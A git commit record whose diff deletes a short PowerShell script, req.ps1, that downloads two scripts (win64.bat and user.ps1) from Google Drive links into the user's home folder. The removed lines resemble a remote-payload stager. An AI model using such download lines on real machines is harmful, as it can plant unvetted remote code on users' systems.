3b0b715d88d50cda2e7cbaef8276fb9c33f6b78d
XzHSSDa <zulhilmijamari1@gmail.com>
2024-09-01 22:28:38 +0800

    Delete req.ps1

--- req.ps1
+++
@@ -1,4 +0,0 @@
-cd C:\Users\$Env:UserName
-Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=15A4osm79MjhBB3FwV35ej0Mh13q_1OxI" -outfile "win64.bat"
-Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=1UGu_G3KF6VvaICIqVJPOBCioIgM9eYTE" -outfile "user.ps1"
-exit
